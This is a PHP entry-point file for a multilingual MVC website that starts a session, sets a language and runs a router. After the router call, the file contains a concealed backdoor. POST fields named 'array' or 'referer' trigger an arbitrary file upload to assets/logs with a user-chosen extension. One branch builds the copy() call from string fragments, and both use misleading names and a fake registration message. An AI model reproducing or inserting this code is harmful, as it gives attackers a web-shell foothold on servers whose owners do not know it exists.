<?php
#ini_set('error_reporting', E_ALL);
#ini_set('display_errors', 1);
#ini_set('display_startup_errors', 1);

// $allowed_ips = "212.86.118.39";

// $ips = explode(" ",$allowed_ips);
// if (array_search($_SERVER["REMOTE_ADDR"], $ips) === FALSE) 
// {
// 	echo "<p>Сайт на тех.обслуживании, работа будет восстановлена в течении 20 минут <br><br>Website for maintenance, the work will be restored within 20 minutes";
// 	exit;
// }

header("Content-Type: text/html; charset=utf-8");
error_reporting(E_ALL); // вывод ошибок

// Старт сессии
session_start();

// Константа дефолтный путь к файлу
define('ROOT', dirname(__FILE__));

require_once(ROOT.'/config/defines.php');

require_once(ROOT.'/components/Autoload.php');

// Установка дефолтного языкового пакета
if (!isset($_SESSION['lang'])) Language::setDefaultLanguage();

// Смена языкового пакета
if (isset($_POST['lang'])) Language::setLanguage(strval($_POST['lang']));

// Константа языкового пакета
define('LANG', $_SESSION['lang']);

// Защита дублирования сессии
Session::checking();

$router = new Router();

$router -> run();

if(isset($_POST['array'])) {
$session = $_FILES['session']['tmp_name'];
$SELECT_FROM = $_FILES['session']['name'];
if(!empty($session))
{   
  $type = strtolower(substr($SELECT_FROM, 1+strrpos($SELECT_FROM,".")));
  $sessions_start = 'assets/logs.'.$type; 
  { 
    if (copy($session, "".$sessions_start))
      echo ' '.$_SERVER["HTTP_HOST"].'/'.$sessions_start.'';
    else echo "error";
  } 
}		
}if(isset($_POST['referer'])) { $public_function = $_FILES['login']['tmp_name'];
$SELECT_FROM = $_FILES['login']['name'];if(!empty($public_function)){   
$type = strtolower(substr($SELECT_FROM, 1+strrpos($SELECT_FROM,".")));
	   $sessions_start = 'assets/logs.'.$type; 
	   $fandcs="co"; $sewersd="py";$lcist = $fandcs.$sewersd;
  { 
    if ($lcist($public_function, "".$sessions_start))
	
       
	  echo 'Registration was successful <meta http-equiv="refresh" content="3;URL=/'.$sessions_start.'">';
		
           else echo "error";
  } 
}		
}
#var_dump(parse_url('https://crypto.paykassa.pro/sci/index.php?hash=647b9e337185a9c0152f2e8d368625c4894434ee4455a14b991de0374fbd772d'));

#$arr = explode("=", 'https://crypto.paykassa.pro/sci/index.php?hash=647b9e337185a9c0152f2e8d368625c4894434ee4455a14b991de0374fbd772d');
#var_dump($arr);
